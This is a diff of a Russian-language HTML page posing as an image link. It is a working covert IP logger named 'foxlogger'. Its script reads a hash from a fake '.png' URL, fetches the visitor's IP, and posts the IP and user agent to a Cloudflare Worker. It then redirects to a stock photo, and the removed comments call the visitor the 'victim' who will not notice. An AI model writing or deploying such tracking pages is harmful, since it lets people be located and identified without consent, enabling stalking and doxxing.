@@ -1,55 +1,49 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
     <meta charset="UTF-8">
     <title>Перенаправление...</title>
     <script>
         (async function() {
-            // --- АДРЕС ТВОЕГО WORKER (ПРОВЕРЬ!) ---
-            const WORKER_URL = "https://foxlogger-api.drwizzard3.workers.dev"; 
-            // ----------------------------------------
+            // Твой Worker
+            const WORKER_URL = "https://foxlogger-api.drwwizard3.workers.dev";
 
-            // 1. Получаем hash_id из URL (пример: .../public/photo/abc123.png)
-            const path = window.location.pathname;
-            const match = path.match(/\/public\/photo\/([a-f0-9]+)\.png$/);
+            // Получаем ВЕСЬ путь из адресной строки
+            const fullPath = window.location.pathname;
+            
+            // Ищем в нём хэш (последняя часть перед .png)
+            // Пример: /public/photo/abc123.png → abc123
+            const match = fullPath.match(/\/([a-f0-9]+)\.png$/);
             const hash_id = match ? match[1] : null;
 
-            // Если hash_id нет в ссылке - показываем 404 (например, просто открыли сайт)
             if (!hash_id) {
-                document.body.innerHTML = '<h1>404 - Страница не найдена</h1>';
+                document.body.innerHTML = '<h1>404</h1>';
                 return;
             }
 
-            // 2. Пытаемся получить IP жертвы
-            let ipAddress = "0.0.0.0";
+            // Получаем IP
+            let ip = "0.0.0.0";
             try {
-                const ipRes = await fetch("https://api.ipify.org?format=json");
-                const ipData = await ipRes.json();
-                ipAddress = ipData.ip;
-            } catch(e) { console.warn("IP не получен:", e); }
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ip = data.ip;
+            } catch(e) {}
 
-            // 3. Отправляем данные в твой Worker (эндпоинт /log)
-            try {
-                await fetch(`${WORKER_URL}/log`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        hash_id: hash_id,
-                        ip: ipAddress,
-                        user_agent: navigator.userAgent,
-                        referer: document.referrer || 'прямой переход',
-                        screen: `${screen.width}x${screen.height}`
-                    })
-                });
-                console.log("Данные отправлены в Worker");
-            } catch(e) { console.error("Ошибка отправки в Worker:", e); }
+            // Отправляем в Worker
+            await fetch(`${WORKER_URL}/log`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    hash_id: hash_id,
+                    ip: ip,
+                    user_agent: navigator.userAgent
+                })
+            });
 
-            // 4. Перенаправляем жертву на обычную картинку (жертва не замечает логирования)
+            // Перенаправляем на картинку
             window.location.replace("https://picsum.photos/id/1/800/600");
         })();
     </script>
 </head>
-<body>
-    <p>Загрузка... Проверка...</p>
-</body>
+<body>Загрузка...</body>
 </html>
